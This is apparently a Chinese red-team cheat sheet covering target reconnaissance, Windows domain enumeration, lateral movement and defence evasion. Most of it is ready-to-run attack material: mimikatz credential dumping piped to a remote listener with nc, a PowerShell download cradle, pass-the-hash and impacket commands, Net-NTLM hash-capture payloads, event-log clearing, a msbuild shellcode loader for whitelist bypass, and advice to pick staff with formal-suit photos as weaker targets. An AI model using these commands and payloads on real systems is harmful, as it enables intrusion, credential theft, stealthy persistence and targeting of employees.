----------
## 1.资产收集

### 1.一级资产
目标的直接资产，如常见的：

>目标子域名
>目标APP资产
>目标域名备案信息
>目标微博，公众号信息
>目标邮箱用户信息
>目标VPN用户信息
>目标GitHub泄露信息
>目标服务器/中间件/CMS信息
>目标所有存活网站的WAF信息
>目标网盘或第三方网盘敏感文件信息
>一级资产主要分两大类：
>技术类，如子域名，C段
>非技术类，如招股书的股权分析，目标公司的运营分析等
>`注：如果目标是To B的公司，其很多核心人员为”非技术类“，这里需要根据目标公司的类型盈利方向等，制定出”适合“目标的特定方案。`

### 2.二级资产
既围绕一级资产向下资产排查。

>1.目标所有一级域名C段
>2.目标所有存活资产的1-65535端口信息
>3.目标历史非存活资产
>4.目标所有主域名的向下第三方资源/资产排查
>5.目标关键人物的第三方信息，如mail，微信，百度网盘，知乎，微博等
>6.目标关键人物私有域名/APP
>7.第三方平台（高频率互动），如BOSS直聘，脉脉，领英等
>8.关键人物GitHub信息泄露
>。。。
>`二级资产的搜集其核心过程“化线为点”，把一级资产信息搜集的方向化解成可量化的点，也就是重点关注目标的某个人，某个物，某件事。`
>`注：在二级资产信息搜集的过程中，尤其是在量化到某个组织“个人”时，部分精力倾斜到头像/照片为正装的目标人员，一般用于个人正装/照片当头像的人，其内心是自信，开朗并且大部分人为非技术人员，也就是安全意识相对较弱。相对较为近距离接触目标人物。在上例“领英”图片Demo中，会发现，随机出现的8人，有3人是非技术类，其中2人头像为“人像”照片，而此8人的技术类，无一使用正装”人像“为头像。`

### 3.上游资产
上游资产，是目标资产的上一个维度的信息搜集，既，降维搜集目标所有的资产其结果将会扩大“一级资产”并且联动了“二级资产”
“上游资产”指“一级资产”的资产链开始端，“上游资产”与“下游资产”最大的区别在于“产业结构分析”与“股权结构分析”。

>业务分类：
>既参股控股公司的主营业务是否与目标一致或一个方向。
>例如：参股控股公司业务是餐饮类，而目标主营业务是IT类，那么就不符合“上游资产”
>盈利分类：
>既参股控股公司的盈利方式，是属于“非盈利”或“纯盈利”
>例如：参股控股公司是某“非盈利”，而目标则是盈利公司，那么就不符合“上游资产”
>`分析“上游资产”时，一定要把“业务分类”与“盈利分类”的思想模型考虑进去，否则”一级资产”会出现非常混乱的结构，从而影响”二级资产“。`

### 4.下游资产
"下游资产"，是目标资产的下一个维度的信息搜集，既，"向下联动并关联"搜集目标所有的资产其结果将会扩大“一级资产”并且联动了“二级资产”范围。
“下游资产”的核心思想与“下游产业”极其相似，"下游产业"指处在整个产业链的末端，加工原材料和零部件，制造成品和从事生产，服务的行业。根据微笑曲线理论，上游往往是利润相对丰厚、竞争缓和的行业，原因是上游往往掌握着某种资源，比如矿产，或掌握核心技术，有较高的进入壁垒的行业。产业要形成竞争优势,就不能缺少世界一流的供应商,也不能缺少上下游产业的密切合作关系。
同样，"下游资产"是目标资产的延伸，既，"一级资产"与"二级资产"向下拓展延伸。在实际情况中，"下游资产"往往是大型目标的突破口，也是薄弱环节，同样它依然需要缜密的分析其两者的关联性。

>排查与分析"下游资产"时，它又分为两类，既：
>A：直接下游资产
>"直接下游资产"的公司与目标直接参与参股控股，一般为80%——100%的投资比例，也就说为"下游资产"的大股东，或者完全控股子公司，其"下游资产"的产业为目标延伸产业互补或者是相同。也需重点关注目标公司实控人的"其他公司"是否有资金往来，业务往来，间接往来关系。
>B：间接下游资产
>"间接下游资产"的公司非与目标间接参与参股控股，或者是小比例的投资比例，非大股东，或者非实际控股，非子公司，其"间接下游资产"的主营产业也不符合目标公司的延申产业或者非互补产业。
>`大型网络对抗需要考虑攻击方的"主要成本"，不同的环境，不同的背景，不同的方案，其"主要成本"不同，有的"主要成本"是时间成本，有的是"金钱成本"，有的是"安全成本"等等，根据所在团队，所在任务，所在背景，建立不同的模型，并且考虑精力倾向于“直接下游资产”或是“间接下游资产”，而在分析的过程中，也一定要考虑目标与"下游资产"的关联性，紧密性，业务性，关系性，来往性，资金性，人员流动性等等。`

----------

## 2.Windows信息收集

### 1.Seatbelt

>Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.
>Seatbelt has been built against .NET 3.5 and is compatible with Visual Studio 2015 Community Edition. Simply open up the project .sln, choose "release", and build.
>https://github.com/GhostPack/Seatbelt

```
collects the following system data:
BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)
RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13
TokenGroupPrivs       -   Current process/token privileges (e.g. SeDebugPrivilege/etc.)
UACSystemPolicies     -   UAC system policies via the registry
PowerShellSettings    -   PowerShell versions and security settings
AuditSettings         -   Audit settings via the registry
WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry
LSASettings           -   LSA settings (including auth packages)
UserEnvVariables      -   Current user environment variables
SystemEnvVariables    -   Current system environment variables
UserFolders           -   Folders in C:\Users\
NonstandardServices   -   Services with file info company names that don't contain 'Microsoft'
InternetSettings      -   Internet settings including proxy configs
LapsSettings          -   LAPS settings, if installed
LocalGroupMembers     -   Members of local admins, RDP, and DCOM
MappedDrives          -   Mapped drives
RDPSessions           -   Current incoming RDP sessions
WMIMappedDrives       -   Mapped drives via WMI
NetworkShares         -   Network shares
FirewallRules         -   Deny firewall rules, "full" dumps all
AntiVirusWMI          -   Registered antivirus (via WMI)
InterestingProcesses  -   "Interesting" processes- defensive products and admin tools
RegistryAutoRuns      -   Registry autoruns
RegistryAutoLogon     -   Registry autologon information
DNSCache              -   DNS cache entries (via WMI)
ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)
AllTcpConnections     -   Lists current TCP connections and associated processes
AllUdpConnections     -   Lists current UDP connections and associated processes
NonstandardProcesses  -   Running processeswith file info company names that don't contain 'Microsoft'
  *  If the user is in high integrity, the following additional actions are run:
SysmonConfig          -   Sysmon configuration from the registry

collects the following user data
SavedRDPConnections   -   Saved RDP connections
TriageIE              -   Internet Explorer bookmarks and history (last 7 days)
DumpVault             -   Dump saved credentials in Windows Vault (i.e. logins from Internet Explorer and Edge), from SharpWeb
RecentRunCommands     -   Recent "run" commands
PuttySessions         -   Interesting settings from any saved Putty configurations
PuttySSHHostKeys      -   Saved putty SSH host keys
CloudCreds            -   AWS/Google/Azure cloud credential files (SharpCloud)
RecentFiles           -   Parsed "recent files" shortcuts (last 7 days)
MasterKeys            -   List DPAPI master keys
CredFiles             -   List Windows credential DPAPI blobs
RDCManFiles           -   List Windows Remote Desktop Connection Manager settings files
  *  If the user is in high integrity, this data is collected for ALL users instead of just the current user

CurrentDomainGroups   -   The current user's local and domain groups
Patches               -   Installed patches via WMI (takes a bit on some systems)
LogonSessions         -   User logon session data
KerberosTGTData       -   ALL TEH TGTZ!
InterestingFiles      -   "Interesting" files matching various patterns in the user's folder
IETabs                -   Open Internet Explorer tabs
TriageChrome          -   Chrome bookmarks and history
TriageFirefox         -   Firefox history (no bookmar`ks)
RecycleBin            -   Items in the Recycle Bin deleted in the last 30 days - only works from a user context!
4624Events            -   4624 logon events from the security event log
4648Events            -   4648 explicit logon events from the security event log
KerberosTickets       -   List Kerberos tickets. If elevated, grouped by all logon sessions.
```

### 2.dsquery

Dsquery是Windows Server 2008中内置的命令行工具。如果您安装了Active Directory域服务（AD DS）服务器角色，则该工具可用。要使用dsquery，必须从提升权限的命令提示符下运行dsquery命令。要打开提升权限的命令提示符，请单击“ 开始”，右键单击“ 命令提示符”，然后单击“以管理员身份运行”。
Dsquery is a command-line tool that is built into Windows Server 2008. It is available if you have the Active Directory Domain Services (AD DS) server role installed. To use dsquery, you must run the dsquery command from an elevated command prompt. To open an elevated command prompt, click Start, right-click Command Prompt, and then click Run as administrator.

用法：

>1.Finds computers in the directory that match search criteria that you specify:
>```dsquery computer```

>2.Finds contacts in the directory that match search criteria that you specify.
>```dsquery contact```

>3.Finds groups in the directory that match search criteria that you specify. If the predefined search criteria in this command are insufficient, use the general version of the query command, dsquery *.
>```dsquery group```

>4.Finds organizational units (OUs) in the directory that match search criteria that you specify. If the predefined search criteria in this command are insufficient, use the more general version of the query command, dsquery *.
>```dsquery ou```

>5.Finds sites in the directory that match search criteria that you specify. If the predefined search criteria in this command are insufficient, use the more general version of the query command, dsquery *.
>```dsquery site```

>6.Finds domain controllers according to specified search criteria. If the predefined search criteria in this command are insufficient, use the more general version of the query command, dsquery *.
>```dsquery server```

>7.Finds users in the directory that match search criteria that you specify. If the predefined search criteria in this command are insufficient, use the more general version of the query command, dsquery *.
>```dsquery user```

>8.Finds quota specifications in the directory that match search criteria that you specify. A quota specification determines the maximum number of directory objects a specified security principal can own in a given directory partition. If the predefined search criteria in this command are insufficient, use the more general version of the query command, dsquery *.
>```dsquery quota```

>9.Finds partition objects in the directory that match search criteria that you specify. If the predefined search criteria in this command are insufficient, use the more general version of the query command, dsquery *.
>```dsquery partition```

>10.Finds any objects in the directory according to criteria using an LDAP query.
>```dsquery *```

### 3.accesschk

为了确保他们创建了安全的环境，Windows管理员通常需要知道特定用户或组对资源的访问权限，这些访问权限包括文件，目录，注册表项，全局对象和Windows服务。AccessChk通过直观的界面和输出快速回答这些问题。
As a part of ensuring that they've created a secure environment Windows administrators often need to know what kind of accesses specific users or groups have to resources including files, directories, Registry keys, global objects and Windows services. AccessChk quickly answers these questions with an intuitive interface and output.
[详细信息](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
用法：

>The following command reports the accesses that the Power Users account has to files and directories in \Windows\System32:

>accesschk "power users" c:\w
>
>indows\system32

>This command shows which Windows services members of the Users group have write access to:

>accesschk users -cw *

>To see what Registry keys under HKLM\CurrentUser a specific account has no access to:

>accesschk -kns austin\mruss hklm\software

>To see the security on the HKLM\Software key:

>accesschk -k hklm\software

>To see all files under \Users\Mark on Vista that have an explicit integrity level:

>accesschk -e -s c:\users\mark

>To see all global objects that Everyone can modify:
>accesschk -wuo everyone \basednamedobjects

## 3.常用命令

#### 1.ping查看存活主机
> for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i"ttl"

#### 2.添加域用户

> net user username password /add /domain

#### 3.添加域用户到管理员组

> net group "Domain Admins" /add /domain username
>
> net group "Domain admins" /del /domain username

#### 4.查询域

> wmic path win32_computersystem get domain

#### 5.查询域控

> wmic ntdomain list brief
>
> net time
>
> net group /doamin
>
> net config workstation

##### 1.查询域管理员用户

> net group “domain admins” /domain

##### 2.查询域用户

> net user /domain

##### 3.查询域名称

> net view /domain

##### 4.查询域内计算机

> net view /domain:XX

##### 5.查询域控制器

> net time /domain

##### 6.查询所有域控制器

> dsquery server

##### 7.查询域内计算机

> dsquery computer

##### 8.查询域内子网

> dsquery subnet

##### 9.查询域内用户组

> dsquery group

##### 10.查询域内组织单位

> dsquery ou

##### 11.查询域内站点

> dsquery site

#### 6.创建进程

> wmic process create "calc.exe"

#### 7.修改进程优先级

（降低某个进程的优先级可能会导致特定的应用程序发生崩溃，而提升某个进程的优先级甚至还会导致整个系统发生崩溃。）

> wmic process where name="calc.exe" call set priority 64

#### 8.终止进程

> wmic process where name="calc.exe" call terminate

#### 9.获取可执行文件列表

> wmic process where "NOT ExecutablePath LIKE  '%Windows%'" GET ExecutablePath

#### 10.获取目录属性

> wmic fsdir where="drive='c:' and filename='test'" get /format:list

#### 11.获取已安装程序列表

>wmic product get name

#### 12.获取正在运行的服务列表
> wmic  service where (status="running") get caption,name,startmode

#### 13.获取BIOS信息

> wmic bios

#### 14.判断目标是否为虚拟机

> wmic onboarddevice get Desciption, DeviceType, Enabled, Status /format:list

#### 15.获取程序名

> wmic product where "name like '%Office%'" get name

#### 16.卸载程序

> wmic product where name="Office" call uninstall

#### 17.获取反病毒产品详细信息

> wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe

#### 18.清理日志

> wmic nteventlog where filename='[logfilename]' cleareventlog
> wmic nteventlog where filename='system' cleareventlog
> wmic nteventlog where filename='security' cleareventlog
> wmic nteventlog where filename='application' cleareventlog
>
> 枚举日志
> wevtutil el
> 查看日志状态信息
> wevtutil gli security
> 查看日志配置信息
> wevtutil gl security
> 查看日志
> wevtutil  qe security
> 删除日志
> wevtutil cl security

#### 19.注册表启动项

用户级:

> HKEY_CURRENT_USER\Software\Microsoft\Windows\currentversion\run
> HKEY_CURRENT_USER\Software\Microsoft\Windows\currentversion\runonce

管理员:

> HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
> HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
> HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

#### 20.RDP

##### 1.开启RDP 

> REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f

##### 2.查看RDP端口

>reg query "HKLM\system\currentControlset\Control\Terminal Server\winstations\RDP-Tcp" /v PortNumber

----------
## 4.横向移动

### 1.getuserspns
获取域用户凭证
用法：

>check ASREPRoast for all domain users (credentials required)
>```python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>```

>check ASREPRoast for a list of users (no credentials required)
>```python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>```

>```python GetUserSPNs.py -request -dc-ip 192.168.244.102 labs.scip.ch/rtam```

获取的凭证可以用hashcat爆破

>```hashcat -m 13100 -a 0 spn.txt /usr/share/wordlists/sqlmap.txt```

[下载地址](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)

### 2.gescdump

### 3.winrm

配置winrm

> winrm quickconfig

添加信任IP

> winrm set winrm/config/client '@{TrustedHosts="*"}'

查看状态

> winrm e winrm/config/listener

执行命令

> winrs -r:http://192.168.0.1:5985 -u:administrator -p:password whoami

关于winrs的[详细使用](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs)

### 4.schtasks

新建定时任务

> schtasks /create /S 192.168.0.1 /TN taskmame /SC ONCE /TR "C:\windows\ipc.bat" /U domain\username /P password /SD 05/19/2020 /ET 20:20 /ST 20:10:00

运行定时任务

> schtasks /run /S 192.168.0.1 /TN taskname

查询定时任务

> schtasks /query /S 192.168.0.1 /TN taskname

删除定时任务

> schtasks /delete /S 192.168.0.1 /TN taskname

### 5.IPC$

建立连接

> net use \\192.168.0.1\ipc$\ "password" /user:"username"

文件传输

> copy \\192.168.0.1\admin$ hack.exe

删除连接

> net use \\192.168.0.1\ipc$ /del

`将上传的文件结合定时任务进行执行`

### 6.psexec

远程执行命令

> psexec \\\192.168.1.113 -u administrator -p 123 cmd

### 7.WMIHACKER

带回显执行命令

```
cscript //nologo WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo" 1
```

无回显执行命令

```
cscript //nologo WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo" 0
```

shell模式

```
cscript //nologo WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator "Password!"
```

文件上传

```
cscript //nologo wmihacker_0.4.vbe /upload 172.16.94.187 administrator "Password!" "c:\windows\system32\calc.exe" "c:\calc"
```

文件下载 

```
cscript //nologo wmihacker_0.4.vbe /download 172.16.94.187 administrator "Password!" "c:\calc" "c:\windows\system32\calc.exe"
```

### 8.mimikatz

可从LSASS中恢复明文密码。

获取用户密码

> mimikatz ""privilege::debug"" ""sekurlsa::logonpasswords"" exit

将执行结果发送到指定地方

> mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit |  nc -vv 192.168.3.251 1234

获取lsass进程

>procdump64.exe -accepteula -ma lsass.exe lsass.dmp

把dmp文件下回到本地机器上执行

>sekurlsa::minidump lsass.dmp
>sekurlsa::logonPasswords full

powershell版

> powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds" | nc -vv 192.168.3.28 1234

哈希传递

> mimikatz
> privilege::debeug
> sekurlsa::pth /user:xxxxxxx /domain:xxxxxxx /ntlm:xxxxxxxxxxxx  #hash传递
> sekurlsa::pth /user:xxxxxxx /domain:xxxxxxx /aes256:xxxxxxxxxxxxxx  #key传递

[下载地址](https://github.com/gentilkiwi/mimikatz/releases)

### 9.netsess

定位域控

### 10.quarkspwdump

Dump various types of Windows credentials without injecting in any process.

[source code (c)](https://github.com/quarkslab/quarkspwdump)
[下载地址](https://github.com/tuthimi/quarkspwdump/tree/master/Release)

> quarkspwdump -dhl

### 11.wce

列出Windows中的登陆会话、增加、修改、查询和删除相关凭据(LM/NT哈希值,Kerberos票据，明文密码)。

列出已登陆的会话和NTLM凭据

> wce -l

复制存储在认证摘要信息中的明文密码。只要有管理员权限就可以抓取密码，无需破解hash值。

> wce -w

### 12.impacket

[windows下载地址](https://github.com/maaaaz/impacket-examples-windows)

1. wmiexec是一个即有全交互也有半交互的远程命令执行工具，可运用于多种环境，包括webshell环境、rdp环境、socks环境等。

> wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c liang/Administrator@10.251.0.109 "ipconfig"
>
> python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c liang/Administrator@10.251.0.109 "ipconfig"

2. smbexe为全交互式工具，所以不可用于webshell环境，可用于rdp等有交互环境登录使用或socks代理环境下使用。

> smbexec.exe -hashes :518b98ad4178a53695dc997aa02d455c liang/administrator@10.251.0.109

3. atexec是通过windows计划任务执行远程命令，atexec是一个半交互的工具，即参数中添加需要在远程主机执行的命令，工具执行后即返回命令结果，适用于webshell下，也适用于其他网络环境。

> atexec.exe liang/administrator:password@10.251.0.109 "whoami"

>  atexec.exe -hashes :DF92E298362E3E180EC0EE7226AFB825 liang/administrator@10.251.0.109 "whoami"

4. psexec，impacket套件内的psexec是一个即有全交互也有半交互的远程命令执行工具，可运用于多种环境，包括webshell环境、rdp环境、socks环境等。

> psexec.exe -hashes :DF92E298362E3E180EC0EE7226AFB825 liang/administrator@10.251.0.109 "whoami"

内网机器遍历做hash传递验证,ips.txt内容为内网ip

> FOR /F %%i in (ips.txt) do atexec.exe ./administrator:password123@%%i whoami

### 13.pth-winexe

kali自带

> pth-winexe -U liang/hack --system --ostype 1 //10.251.0.109 cmd

### 14.CrackMapExec

批量PTT

[下载地址](https://github.com/byt3bl33d3r/CrackMapExec/releases)

> crackmapexec 192.168.3.0/24 -u administrator -H ccef208c6485269c20db2cad21734fe7

### 15.kekeo

无管理员权限PTT

> tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c
>
> kerberos::ptt 票据文件

[下载地址](https://github.com/gentilkiwi/kekeo/releases)

### 16.中间人攻击的方式来获取Net-NTLM hash

[Responder](https://github.com/lgandx/Responder)

[Inveigh](https://github.com/Kevin-Robertson/Inveigh)

1. 开启监听

```bash
python Responder.py -I eth0 -rPv
```

2. 获取Net-NTLM hash

+ 在同一网段下的一个测试主机运行Inveigh

```powershell
Import-Module .\Inveigh.psd1
Invoke-Inveigh -consoleoutput Y
如果powershell不能运行脚本set-ExecutionPolicy RemoteSigned开启脚本功能
```

+ 创建快捷方式

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("StealMyHashes.lnk")
$lnk.TargetPath = "\\10.251.0.105\@OsandaMalith";
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
#$lnk.Description = "I will Steal your Hashes"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

+ MYSQL

```sql

select load_file('\\\\error\\abc');
select load_file(0x5c5c5c5c6572726f725c5c616263);
select 'osanda' into dumpfile '\\\\error\\abc';
select 'osanda' into outfile '\\\\error\\abc';
load data infile '\\\\error\\abc' into table database.table_name;
selct locad_file("\\\\attck_ip")
```

+ MSSQL

```sql
declare @q varchar(99);set @q='\\10.251.0.105\test'; exec master.dbo.xp_dirtree @q
```

+ php LFI

```php
<?php include("\\\10.251.0.105\"); ?>
```

+ XXE

```xml

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=//192.168.0.102/abc" >
]>
<root>
  <name></name>
  <tel></tel>
  <email>OUT&xxe;OUT</email>
  <password></password>
</root>
```

+ XPath

```bash
http://192.168.0.103/?title=Foundation&type=*&rent_days=* and doc('//192.168.0.102/abc')
```

3. hashcat爆破Net-NTLM hash

```bash
hashcat -m 5600 USER001::USER001-PC:d451c1e265b21661:888D693102094212A2583C051C641107:01010000000000006E8993EBDF71D60171C33BD2CF97C5D0000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C00080030003000000000000000010000000020000036C3F143531406ACB10BDE501A063B5F9D384C6659B8BE316FDEA301609222860A001000000000000000000000000000000000000900220048005400540050002F00310030002E003200350031002E0030002E003100300035000000000000000000 /usr/share/john/password.lst --force
```

### 17.MSF转CS

1. 首先cs创建一个windows/becon_http/reverse_http的 Listener
2. 在msf中执行：

>   use exploit/windows/**local**/payload_inject
>
>  set PAYLOAD windows/meterpreter/reverse_http
>
> set DisablePayloadHandler true//设置不单独创建session
>
> set LHOST 192.168.0.143
>
> set LPORT 4444
>
> set SESSION 1
>
> exploit

### 18.CS转MSF

1. 先用msf监听

> use exploit/multi/handler
>
> set payload windows/meterpreter/reverse_tcp
>
> set lhost 192.168.0.143
>
> set lport 4444
>
> exploit

2. 再用cs反弹

创建一个windows/foreign/reverse_tcp的 Listener
然后选中对应机器，右键->Spawn，选择刚刚创建的监听器。

----------

## 5.命令执行绕过防御

### 1.IEExec
IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。可以将IEExec.exe应用程序用作主机，以运行使用URL启动的其他托管应用程序。

位置：

> C:\Windows\Microsoft.NET\Framework64\v2.0.50727

执行方式：

>ieexec.exe http://xxx.com/xxx.exe

### 2.msbuild

路径: 

> C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe

执行:

> C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\evil.xml

evil.xml

[xml github](https://github.com/3gstudent/msbuild-inline-task)

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee --> 
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
            byte[] shellcode = new byte[341] {
                0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
                0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
                0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
                0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
                0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
                0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
                0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
                0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
                0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
                0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,
                0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0x19,0x14,
                0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,
                0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,
                0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,
                0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,
                0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,
                0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,
                0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,
                0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,
                0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,
                0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,
                0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5
            };
              
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

替换shellcode即可

### 3.csc+InstallUtil

[InstallUtil-ShellCode Download](https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/InstallUtil-Shellcode.cs)

模板：

```c#
using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
 
/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Step One:
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /unsafe /platform:x86 /out:exeshell.exe Shellcode.cs
Step Two:
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
(Or)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
	The gist of this one is we can exhibit one behaviour if the application is launched via normal method, Main().
	Yet, when the Assembly is launched via InstallUtil.exe, it is loaded via Reflection and circumvents many whitelist controls.
	We believe the root issue here is:
	
	The root issue here with Assembly.Load() is that at the point at which execute operations are detected 
	(CreateFileMapping->NtCreateSection), only read-only access to the section is requested, so it is not processed as an execute operation.  
	Later, execute access is requested in the file mapping (MapViewOfFile->NtMapViewOfSection), 
	which results in the image being mapped as EXECUTE_WRITECOPY and subsequently allows unchecked execute access.
	
	The concern is this technique can circumvent many security products, so I wanted to make you aware and get any feedback.
	Its not really an exploit, but just a creative way to launch an exe/assembly.
*/
 
//root@infosec:~# msfvenom --payload windows/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f csharp > pentestShellCode.txt

	public class Program
	{
		public static void Main()
		{
			Console.WriteLine("Hello From Main...I Don't Do Anything");
			//Add any behaviour here to throw off sandbox execution/analysts :)
			
		}
		
	}
	
	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
	    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
	    public override void Uninstall(System.Collections.IDictionary savedState)
	    {
		
		Shellcode.Exec();
	    	
	    }
	    
	}
	
	public class Shellcode
	{
			public static void Exec()
			{
				// native function's compiled code
